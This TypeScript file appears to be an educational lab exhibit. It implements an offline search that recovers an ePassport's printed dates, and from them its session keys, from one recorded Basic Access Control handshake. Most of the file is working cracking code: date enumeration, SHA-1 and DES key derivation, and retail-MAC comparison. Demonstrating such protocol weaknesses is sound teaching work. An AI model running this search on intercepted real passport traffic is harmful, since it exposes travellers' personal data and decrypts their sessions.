/**
 * The offline search — exhibit 5.
 *
 * ## What this demonstrates
 *
 * Whoever records one Basic Access Control handshake can test a guess at the
 * printed data without the passport, without the reader, and without ever
 * going back to the chip. The recording's M_IFD is a retail MAC over E_IFD
 * under K_MAC, and K_MAC is a function of the printed data alone. So a
 * candidate is tested by deriving K_MAC from it and recomputing the MAC: a
 * match means the guess is right, and the same guess yields K_Enc, which
 * decrypts the recording.
 *
 * This is the "eavesdropping" attack Appendix A distinguishes from skimming:
 *
 *   "Eavesdropping: this is an offline attack, i.e. the attacker tries to
 *   decrypt intercepted communication without access to the contactless IC."
 *
 * Nothing in the protocol is executed badly here. Every MAC verifies, both
 * nonces come from `crypto.getRandomValues`, and both sides accept. The
 * recording still falls, because the key was never stronger than the data
 * printed on the page.
 *
 * ## What the searcher is given, and nothing more
 *
 * Invariant 3: the search receives the recorded bytes and whatever the learner
 * declares known, and that is all. `SearchTask` has no field for a key, a
 * nonce, or the true dates — so there is nothing to leak by accident, and
 * `search.test.ts` asserts the serialized task carries none of them. Whether
 * the search SUCCEEDED is judged outside: by comparing the dates it reports
 * against the true ones, and by decrypting the recording with the keys it
 * derived.
 *
 * ## The cost of one guess
 *
 * Two SHA-1 compressions and seven single-DES block operations:
 *
 *   SHA-1(MRZ_information)          -> K_seed        one 64-byte block
 *   SHA-1(K_seed ‖ 00000002)        -> K_MAC         one 64-byte block
 *   retail MAC over E_IFD           -> candidate MAC five blocks CBC under Ka,
 *                                                    then D(Kb) and E(Ka)
 *
 * Only counter 2 is needed to test a candidate: K_Enc is derived once, after a
 * hit, to decrypt. That halves the key-derivation work per guess relative to
 * deriving both.
 */
import { ascii, bytesEqual, concat } from './bytes';
import { adjustParity, counterBytes, COUNTER_MAC, K_SEED_BYTES } from './kdf';
import { checkDigit, padDocumentNumber } from './mrz';
import { retailMacKey, retailMacWithKey } from './retailmac';
import { sha1 } from './sha1';

/**
 * What the learner declares they already know.
 *
 * Each field named here is removed from the search space, which is the point
 * of exhibit 4's controls: the document number is "not typically considered a
 * secret" — the 2005 paper's words, listing cruise ships, travel agents and
 * airlines as parties who see it — and declaring it known is what turns a
 * 56-bit count into a 17-bit one.
 */
export interface DeclaredKnowledge {
  /** The document number, as printed. Required: this lab does not search it. */
  readonly documentNumber: string;
  /** Two-digit years to try for the date of birth, e.g. [69] or [60..99]. */
  readonly birthYears: readonly number[];
  /** Two-digit years to try for the date of expiry. */
  readonly expiryYears: readonly number[];
}

/** Exactly what crossed the air, and the only cryptographic input. */
export interface RecordedBytes {
  readonly eIfd: Uint8Array;
  readonly mIfd: Uint8Array;
}

/**
 * A complete search task. This is the whole message the worker receives.
 *
 * Note the absence: no key, no nonce, no true date, no `Handshake`. The type
 * is the enforcement of invariant 3, and `assertNoSecrets` below is the
 * runtime half, because `postMessage` erases types.
 */
export interface SearchTask {
  readonly known: DeclaredKnowledge;
  readonly recording: RecordedBytes;
}

export interface SearchProgress {
  readonly tried: number;
  readonly total: number;
  readonly elapsedMs: number;
  readonly guessesPerSecond: number;
}

export interface SearchHit {
  readonly outcome: 'found';
  readonly dateOfBirth: string;
  readonly dateOfExpiry: string;
  readonly documentNumber: string;
  /** The MRZ_information the winning candidate built. */
  readonly mrzInformation: string;
  readonly tried: number;
  readonly total: number;
  readonly elapsedMs: number;
  readonly guessesPerSecond: number;
}

export interface SearchMiss {
  readonly outcome: 'not-found';
  readonly tried: number;
  readonly total: number;
  readonly elapsedMs: number;
  readonly guessesPerSecond: number;
}

export interface SearchCancelled {
  readonly outcome: 'cancelled';
  readonly tried: number;
  readonly total: number;
  readonly elapsedMs: number;
  readonly guessesPerSecond: number;
}

export type SearchOutcome = SearchHit | SearchMiss | SearchCancelled;

/* ── Enumerating the declared space ───────────────────────────────────────── */

/** Every valid YYMMDD date in a two-digit year. 366 days in a leap year. */
export function datesInYear(year: number): string[] {
  if (!Number.isInteger(year) || year < 0 || year > 99) {
    throw new Error(`a two-digit MRZ year is 0 to 99, got ${year}`);
  }
  const yy = String(year).padStart(2, '0');
  const out: string[] = [];
  for (let month = 1; month <= 12; month++) {
    // The two-digit year is read as 20YY to settle February, which is the
    // permissive choice: it admits 29 February when YY is divisible by four.
    const days = new Date(Date.UTC(2000 + year, month, 0)).getUTCDate();
    const mm = String(month).padStart(2, '0');
    for (let day = 1; day <= days; day++) {
      out.push(`${yy}${mm}${String(day).padStart(2, '0')}`);
    }
  }
  return out;
}

/** Every date in every declared year, in order. */
export function datesInYears(years: readonly number[]): string[] {
  const out: string[] = [];
  for (const year of years) out.push(...datesInYear(year));
  return out;
}

/** How many candidates a declared space holds. */
export function spaceSize(known: DeclaredKnowledge): number {
  return datesInYears(known.birthYears).length * datesInYears(known.expiryYears).length;
}

/* ── Invariant 3, enforced at runtime ─────────────────────────────────────── */

/**
 * Throw if a task carries anything but the recording and the declared fields.
 *
 * A type cannot survive `postMessage`, and the failure this guards against is
 * a convenience edit — passing the whole `Handshake` because the recording is
 * inside it — which would hand the worker the keys and make the exhibit a
 * demonstration of nothing. So the shape is checked, by key name, before the
 * search starts.
 */
export function assertNoSecrets(task: SearchTask): void {
  const top = Object.keys(task).sort();
  if (top.length !== 2 || top[0] !== 'known' || top[1] !== 'recording') {
    throw new Error(
      `a search task carries exactly { known, recording }; this one has ${top.join(', ')}`
    );
  }
  const recording = Object.keys(task.recording).sort();
  if (recording.length !== 2 || recording[0] !== 'eIfd' || recording[1] !== 'mIfd') {
    throw new Error(
      `a recording carries exactly { eIfd, mIfd }; this one has ${recording.join(', ')}`
    );
  }
  const known = Object.keys(task.known).sort();
  const allowed = ['birthYears', 'documentNumber', 'expiryYears'];
  for (const key of known) {
    if (!allowed.includes(key)) {
      throw new Error(`declared knowledge may not carry ${key}`);
    }
  }
}

/* ── The search itself ────────────────────────────────────────────────────── */

export interface SearchHooks {
  /** Called every `chunkSize` candidates. Return false to stop the search. */
  readonly onProgress?: (progress: SearchProgress) => boolean | void;
  /** How many candidates to try between progress callbacks. */
  readonly chunkSize?: number;
  /** Supplies the clock, so a test can make the rate deterministic. */
  readonly now?: () => number;
}

/**
 * Try every candidate in the declared space against the recording.
 *
 * The loop is arranged so that everything independent of the candidate is
 * computed once:
 *
 *  - the document number and its check digit become a fixed string prefix;
 *  - each date's check digit is computed once per date rather than once per
 *    pair, which matters because the outer loop's date is reused across the
 *    whole inner loop;
 *  - the recorded E_IFD is padded once, outside everything.
 *
 * What is NOT hoisted is the comparison: `bytesEqual` walks all eight bytes of
 * the MAC every time. Comparing only the first four would be about as fast and
 * would accept roughly one wrong candidate in four billion — mutation 12.
 */
export function search(task: SearchTask, hooks: SearchHooks = {}): SearchOutcome {
  assertNoSecrets(task);
  const now = hooks.now ?? (() => performance.now());
  const chunkSize = hooks.chunkSize ?? 4096;

  const documentNumber = padDocumentNumber(task.known.documentNumber);
  const prefix = documentNumber + checkDigit(documentNumber);

  const births = datesInYears(task.known.birthYears);
  const expiries = datesInYears(task.known.expiryYears);
  // Per-date check digits, computed once each rather than once per pair.
  const birthFields = births.map((date) => date + checkDigit(date));
  const expiryFields = expiries.map((date) => date + checkDigit(date));

  const total = births.length * expiries.length;
  const recordedMac = task.recording.mIfd;
  const eIfd = task.recording.eIfd;
  const macCounter = counterBytes(COUNTER_MAC);

  const started = now();
  let tried = 0;
  let sinceReport = 0;

  for (let b = 0; b < birthFields.length; b++) {
    const withBirth = prefix + birthFields[b];
    for (let e = 0; e < expiryFields.length; e++) {
      const candidate = withBirth + expiryFields[e];

      // Printed data -> K_seed -> K_MAC, exactly as the chip does it.
      const kSeed = sha1(ascii(candidate)).subarray(0, K_SEED_BYTES);
      const kMac = adjustParity(sha1(concat(kSeed, macCounter)).subarray(0, 16));

      // The candidate matches if it reproduces the recorded checksum.
      if (bytesEqual(retailMacWithKey(retailMacKey(kMac), eIfd), recordedMac)) {
        const elapsedMs = now() - started;
        return {
          outcome: 'found',
          dateOfBirth: births[b],
          dateOfExpiry: expiries[e],
          documentNumber,
          mrzInformation: candidate,
          tried: tried + 1,
          total,
          elapsedMs,
          guessesPerSecond: rate(tried + 1, elapsedMs),
        };
      }

      tried++;
      sinceReport++;
      if (sinceReport >= chunkSize) {
        sinceReport = 0;
        const elapsedMs = now() - started;
        const keepGoing = hooks.onProgress?.({
          tried,
          total,
          elapsedMs,
          guessesPerSecond: rate(tried, elapsedMs),
        });
        if (keepGoing === false) {
          return {
            outcome: 'cancelled',
            tried,
            total,
            elapsedMs,
            guessesPerSecond: rate(tried, elapsedMs),
          };
        }
      }
    }
  }

  const elapsedMs = now() - started;
  return {
    outcome: 'not-found',
    tried,
    total,
    elapsedMs,
    guessesPerSecond: rate(tried, elapsedMs),
  };
}

function rate(tried: number, elapsedMs: number): number {
  if (elapsedMs <= 0) return 0;
  return (tried / elapsedMs) * 1000;
}

/**
 * Derive the keys a hit implies, so the recording can actually be opened.
 *
 * Kept separate from `search` on purpose: finding a MAC collision is a claim,
 * and decrypting the recording to the nonces and keying material that were
 * really sent is the evidence. Exhibit 5 shows both, and `search.test.ts`
 * requires the decryption to succeed before it will call a trial a success.
 */
export function keysFromHit(hit: SearchHit): { kSeed: Uint8Array } {
  return { kSeed: sha1(ascii(hit.mrzInformation)).slice(0, K_SEED_BYTES) };
}
